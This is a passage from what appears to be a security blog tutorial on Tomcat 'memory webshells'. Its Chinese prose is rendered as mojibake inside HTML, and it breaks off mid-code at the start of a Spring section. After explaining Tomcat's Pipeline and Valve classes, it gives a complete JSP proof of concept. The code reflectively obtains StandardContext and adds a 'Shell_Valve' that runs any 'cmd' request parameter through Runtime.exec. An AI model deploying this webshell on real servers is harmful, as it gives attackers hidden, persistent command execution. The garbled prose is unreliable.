title="ä»€ä¹ˆæ˜¯valveï¼Ÿ"></a>ä»€ä¹ˆæ˜¯valveï¼Ÿ</h4><p>åœ¨äº†è§£Valveä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥ç®€å•äº†è§£ä¸€ä¸‹Tomcatä¸­çš„<code>ç®¡é“æœºåˆ¶</code>ã€‚</p><p>æˆ‘ä»¬çŸ¥é“ï¼Œå½“Tomcatæ¥æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚æ—¶ï¼Œé¦–å…ˆä¼šä½¿ç”¨<code>Connector</code>è¿›è¡Œè§£æï¼Œç„¶åå‘é€åˆ°<code>Container</code>è¿›è¡Œå¤„ç†ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„æ¶ˆæ¯åˆæ˜¯æ€ä¹ˆåœ¨å››ç±»å­å®¹å™¨ä¸­å±‚å±‚ä¼ é€’ï¼Œæœ€ç»ˆé€åˆ°Servletè¿›è¡Œå¤„ç†çš„å‘¢ï¼Ÿè¿™é‡Œæ¶‰åŠåˆ°çš„æœºåˆ¶å°±æ˜¯Tomcatç®¡é“æœºåˆ¶ã€‚</p><p>ç®¡é“æœºåˆ¶ä¸»è¦æ¶‰åŠåˆ°ä¸¤ä¸ªåè¯ï¼ŒPipelineï¼ˆç®¡é“ï¼‰å’ŒValveï¼ˆé˜€é—¨ï¼‰ã€‚å¦‚æœæˆ‘ä»¬æŠŠè¯·æ±‚æ¯”ä½œç®¡é“ï¼ˆPipelineï¼‰ä¸­æµåŠ¨çš„æ°´ï¼Œé‚£ä¹ˆé˜€é—¨ï¼ˆValveï¼‰å°±å¯ä»¥ç”¨æ¥åœ¨ç®¡é“ä¸­å®ç°å„ç§åŠŸèƒ½ï¼Œå¦‚æ§åˆ¶æµé€Ÿç­‰ã€‚å› æ­¤é€šè¿‡ç®¡é“æœºåˆ¶ï¼Œæˆ‘ä»¬èƒ½æŒ‰ç…§éœ€æ±‚ï¼Œç»™åœ¨ä¸åŒå­å®¹å™¨ä¸­æµé€šçš„è¯·æ±‚æ·»åŠ å„ç§ä¸åŒçš„ä¸šåŠ¡é€»è¾‘ï¼Œå¹¶æå‰åœ¨ä¸åŒå­å®¹å™¨ä¸­å®Œæˆç›¸åº”çš„é€»è¾‘æ“ä½œã€‚è¿™é‡Œçš„è°ƒç”¨æµç¨‹å¯ä»¥ç±»æ¯”ä¸ºFilterä¸­çš„è´£ä»»é“¾æœºåˆ¶</p><p><img src="https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220218104446.png" alt="img24"></p><p>åœ¨Tomcatä¸­ï¼Œå››å¤§ç»„ä»¶Engineã€Hostã€Contextä»¥åŠWrapperéƒ½æœ‰å…¶å¯¹åº”çš„Valveç±»ï¼ŒStandardEngineValveã€StandardHostValveã€StandardContextValveä»¥åŠStandardWrapperValveï¼Œä»–ä»¬åŒæ—¶ç»´æŠ¤ä¸€ä¸ªStandardPipelineå®ä¾‹ã€‚</p><h4 id="ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ"><a href="#ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ" class="headerlink" title="ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ"></a>ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ</h4><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹Pipelineæ¥å£ï¼Œç»§æ‰¿äº†Containedæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Pipeline</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Contained</span> &#123;<br> <br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getBasic</span><span class="hljs-params">()</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBasic</span><span class="hljs-params">(Valve valve)</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addValve</span><span class="hljs-params">(Valve valve)</span>;<br> <br>    <span class="hljs-keyword">public</span> Valve[] getValves();<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeValve</span><span class="hljs-params">(Valve valve)</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findNonAsyncValves</span><span class="hljs-params">(Set&lt;String&gt; result)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Pipelineæ¥å£æä¾›äº†å„ç§å¯¹Valveçš„æ“ä½œæ–¹æ³•ï¼Œå¦‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>addValve()</code>æ–¹æ³•æ¥æ·»åŠ ä¸€ä¸ªValveã€‚ä¸‹é¢æˆ‘ä»¬å†æ¥çœ‹çœ‹Valveæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br> <br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­getNext()æ–¹æ³•å¯ä»¥ç”¨æ¥è·å–ä¸‹ä¸€ä¸ªValveï¼ŒValveçš„è°ƒç”¨è¿‡ç¨‹å¯ä»¥ç†è§£æˆç±»ä¼¼Filterä¸­çš„è´£ä»»é“¾æ¨¡å¼ï¼ŒæŒ‰é¡ºåºè°ƒç”¨ã€‚</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E7%AE%A1%E9%81%93%E6%9C%BA%E5%88%B6.jpg" alt="img25"></p><p>åŒæ—¶Valveå¯ä»¥é€šè¿‡é‡å†™<code>invoke()</code>æ–¹æ³•æ¥å®ç°å…·ä½“çš„ä¸šåŠ¡é€»è¾‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Valve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            ...<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡æºç çœ‹ä¸€çœ‹ï¼Œæ¶ˆæ¯åœ¨å®¹å™¨ä¹‹é—´æ˜¯å¦‚ä½•ä¼ é€’çš„ã€‚é¦–å…ˆæ¶ˆæ¯ä¼ é€’åˆ°Connectorè¢«è§£æåï¼Œåœ¨<code>org.apache.catalina.connector.CoyoteAdapter#service</code>æ–¹æ³•ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(org.apache.coyote.Request req, org.apache.coyote.Response res)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (Request) req.getNote(ADAPTER_NOTES);<br>        <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> (Response) res.getNote(ADAPTER_NOTES);<br> <br>        <span class="hljs-keyword">if</span> (request == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// Create objects</span><br>            request = connector.createRequest();<br>            request.setCoyoteRequest(req);<br>            response = connector.createResponse();<br>            response.setCoyoteResponse(res);<br> <br>            <span class="hljs-comment">// Link objects</span><br>            request.setResponse(response);<br>            response.setRequest(request);<br> <br>            <span class="hljs-comment">// Set as notes</span><br>            req.setNote(ADAPTER_NOTES, request);<br>            res.setNote(ADAPTER_NOTES, response);<br> <br>            <span class="hljs-comment">// Set query string encoding</span><br>            req.getParameters().setQueryStringCharset(connector.getURICharset());<br>        &#125;<br>...<br> <br>    <span class="hljs-keyword">try</span> &#123;<br>            ...<br>            connector.getService().getContainer().getPipeline().getFirst().invoke(   request, response);<br>            &#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>å‰é¢æ˜¯å¯¹Requestå’ŒResponeå¯¹è±¡è¿›è¡Œä¸€äº›åˆ¤æ–­åŠåˆ›å»ºæ“ä½œï¼Œæˆ‘ä»¬é‡ç‚¹æ¥çœ‹ä¸€ä¸‹<code>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)</code></p><p>é¦–å…ˆé€šè¿‡<code>connector.getService()</code>æ¥è·å–ä¸€ä¸ªStandardServiceå¯¹è±¡</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-47.png" alt="img26"></p><p>æ¥ç€é€šè¿‡<code>StandardService</code>.<code>getContainer().getPipeline()</code>è·å–<code>StandardPipeline</code>å¯¹è±¡ã€‚</p><p>å†é€šè¿‡<code>StandardPipeline.getFirst()</code>è·å–ç¬¬ä¸€ä¸ªValve</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getFirst</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (first != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> first;<br>        &#125;<br> <br>        <span class="hljs-keyword">return</span> basic;<br>    &#125;<br></code></pre></td></tr></table></figure><p>æœ€åé€šè¿‡è°ƒç”¨<code>StandardEngineValve.invoke()</code>æ¥å®ç°Valveçš„å„ç§ä¸šåŠ¡é€»è¾‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br> <br>        <span class="hljs-comment">// Select the Host to be used for this Request</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> request.getHost();<br>        <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// HTTP 0.9 or HTTP 1.0 request without a host when no default host</span><br>            <span class="hljs-comment">// is defined.</span><br>            <span class="hljs-comment">// Don&#x27;t overwrite an existing error</span><br>            <span class="hljs-keyword">if</span> (!response.isError()) &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (request.isAsyncSupported()) &#123;<br>            request.setAsyncSupported(host.getPipeline().isAsyncSupported());<br>        &#125;<br> <br>        <span class="hljs-comment">// Ask this Host to process this request</span><br>        host.getPipeline().getFirst().invoke(request, response);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>host.getPipeline().getFirst().invoke(request, response)</code>å®ç°è°ƒç”¨åç»­çš„Valveã€‚</p><h4 id="åŠ¨æ€æ·»åŠ Valve"><a href="#åŠ¨æ€æ·»åŠ Valve" class="headerlink" title="åŠ¨æ€æ·»åŠ Valve"></a>åŠ¨æ€æ·»åŠ Valve</h4><p>æ ¹æ®ä¸Šæ–‡çš„åˆ†ææˆ‘ä»¬èƒ½å¤Ÿæ€»ç»“å‡ºValveå‹å†…å­˜é©¬çš„æ³¨å…¥æ€è·¯</p><ol><li>è·å–<code>StandardContext</code>å¯¹è±¡</li><li>é€šè¿‡<code>StandardContext</code>å¯¹è±¡è·å–<code>StandardPipeline</code></li><li>ç¼–å†™æ¶æ„Valve</li><li>é€šè¿‡<code>StandardPipeline.addValve()</code>åŠ¨æ€æ·»åŠ Valve</li></ol><h5 id="è·å–StandardPipelineå¯¹è±¡"><a href="#è·å–StandardPipelineå¯¹è±¡" class="headerlink" title="è·å–StandardPipelineå¯¹è±¡"></a>è·å–StandardPipelineå¯¹è±¡</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>%&gt;<br></code></pre></td></tr></table></figure><h5 id="ç¼–å†™æ¶æ„Valveç±»"><a href="#ç¼–å†™æ¶æ„Valveç±»" class="headerlink" title="ç¼–å†™æ¶æ„Valveç±»"></a>ç¼–å†™æ¶æ„Valveç±»</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Valve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h5 id="å°†æ¶æ„Valveæ·»åŠ è¿›StandardPipeline"><a href="#å°†æ¶æ„Valveæ·»åŠ è¿›StandardPipeline" class="headerlink" title="å°†æ¶æ„Valveæ·»åŠ è¿›StandardPipeline"></a>å°†æ¶æ„Valveæ·»åŠ è¿›StandardPipeline</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Shell_Valve</span> <span class="hljs-variable">shell_valve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Valve</span>();<br>    pipeline.addValve(shell_valve);<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="å®Œæ•´POC-3"><a href="#å®Œæ•´POC-3" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>%&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Valve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br> <br>&lt;%<br>    <span class="hljs-type">Shell_Valve</span> <span class="hljs-variable">shell_valve</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Valve</span>();<br>    pipeline.addValve(shell_valve);<br>%&gt;<br></code></pre></td></tr></table></figure><p>è®¿é—®Valve.jsp</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-48.png" alt="img27"></p><p>ä»»æ„è·¯å¾„å³å¯å‘½ä»¤æ‰§è¡Œ</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-49.png" alt="img28"></p><h2 id="Springå†…å­˜é©¬"><a href="#Springå†…å­˜é©¬" class="headerlink" title="Springå†…å­˜é©¬"></a>Springå†…å­˜é©¬</h2><h3 id="ä»€ä¹ˆæ˜¯Spring"><a href="#ä»€ä¹ˆæ˜¯Spring" class="headerlink" title="ä»€ä¹ˆæ˜¯Spring"></a>ä»€ä¹ˆæ˜¯Spring</h3><p>Springæ˜¯ä¸€ä¸ªè½»é‡çº§çš„Javaå¼€æºæ¡†æ¶ï¼Œç”¨äºé…ç½®ã€ç®¡ç†å’Œç»´æŠ¤Beanï¼ˆç»„ä»¶ï¼‰çš„ä¸€ç§æ¡†æ¶ï¼Œå…¶æ ¸å¿ƒç†å¿µå°±æ˜¯<strong>IoC(Inversion of Control,æ§åˆ¶åè½¬)</strong> å’Œ **AOP(AspectOrientedProgrammingï¼Œ é¢å‘åˆ‡é¢ç¼–ç¨‹)**ã€‚ç°å¦‚ä»ŠSpringå…¨å®¶æ¡¶å·²æ˜¯ä¸€ä¸ªåºå¤§çš„å®¶æ—</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/1.webp" alt="img29"></p><p>Springçš„å‡ºç°å¤§å¤§ç®€åŒ–äº†JavaEEçš„å¼€å‘æµç¨‹ï¼Œå‡å°‘äº†Javaå¼€å‘æ—¶å„ç§ç¹ççš„é…ç½®ã€‚</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/14795543-ac51408a17d53289.webp" alt="img30"></p><p>Springæ¡†æ¶çš„æ ¸å¿ƒä¹‹ä¸€å°±æ˜¯åˆ†å±‚ï¼Œå…¶ç”±è®¸å¤šå¤§å¤§å°å°çš„ç»„ä»¶æ„æˆï¼Œæ¯ç§ç»„ä»¶éƒ½å®ç°ä¸åŒåŠŸèƒ½ã€‚</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/14795543-37dab574499d0f4a.webp" alt="img31"></p><h4 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h4><p>SpringBoot åŸºäº Spring å¼€å‘ã€‚ä¸ä»…ç»§æ‰¿äº†Springæ¡†æ¶åŸæœ‰çš„ä¼˜ç§€ç‰¹æ€§ï¼Œå®ƒå¹¶ä¸æ˜¯ç”¨æ¥æ›¿ä»£ Spring çš„è§£å†³æ–¹æ¡ˆï¼Œè€Œå’Œ Spring æ¡†æ¶ç´§å¯† ç»“åˆè¿›ä¸€æ­¥ç®€åŒ–äº†Springåº”ç”¨çš„æ•´ä¸ªæ­å»ºå’Œå¼€å‘è¿‡ç¨‹ã€‚å…¶è®¾è®¡ç›®çš„æ˜¯ç”¨æ¥ç®€åŒ– Spring åº”ç”¨çš„åˆå§‹æ­å»ºä»¥åŠå¼€å‘è¿‡ç¨‹ã€‚</p><p>é‡‡ç”¨ Spring Boot å¯ä»¥å¤§å¤§çš„ç®€åŒ–å¼€å‘æ¨¡å¼ï¼Œå®ƒé›†æˆäº†å¤§é‡å¸¸ç”¨çš„ç¬¬ä¸‰æ–¹åº“é…ç½®ï¼Œæ‰€æœ‰ä½ æƒ³é›†æˆçš„å¸¸ç”¨æ¡†æ¶ï¼Œå®ƒéƒ½æœ‰å¯¹åº”çš„ç»„ä»¶æ”¯æŒï¼Œä¾‹å¦‚ Redisã€MongoDBã€Dubboã€kafkaï¼ŒESç­‰ç­‰ã€‚SpringBoot åº”ç”¨ä¸­è¿™äº›ç¬¬ ä¸‰æ–¹åº“å‡ ä¹å¯ä»¥é›¶é…ç½®åœ°å¼€ç®±å³ç”¨ï¼Œå¤§éƒ¨åˆ†çš„ SpringBoot åº”ç”¨éƒ½åªéœ€è¦éå¸¸å°‘é‡çš„é…ç½®ä»£ç ï¼Œå¼€å‘è€…èƒ½å¤Ÿæ›´åŠ ä¸“æ³¨äºä¸šåŠ¡é€»è¾‘ã€‚ å¦å¤–SpringBooté€šè¿‡é›†æˆå¤§é‡çš„æ¡†æ¶ä½¿å¾—ä¾èµ–åŒ…çš„ç‰ˆæœ¬å†²çªï¼Œä»¥åŠå¼•ç”¨çš„ä¸ç¨³å®šæ€§ç­‰é—®é¢˜å¾—åˆ°äº†å¾ˆå¥½çš„è§£å†³ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬å°±é€šè¿‡IDEAä¸­çš„Spring Initializræ¥å¿«é€Ÿæ„å»ºä¸€ä¸ªåŸºäºSpringBootçš„Webé¡¹ç›®</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-50.png" alt="img32"></p><p>é€‰æ‹©Spring Web</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-51.png" alt="img33"></p><p>åˆ›å»ºå¥½ä¹‹åï¼ŒIDEAä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªå¯åŠ¨ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.spring;<br> <br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br> <br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(Application.class, args);<br>    &#125;<br> <br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬å°±å¯ä»¥ç¼–å†™ç›¸åº”çš„Controllerï¼ˆæ§åˆ¶å™¨ï¼‰åŠå„ç§ä¸šåŠ¡é€»è¾‘äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 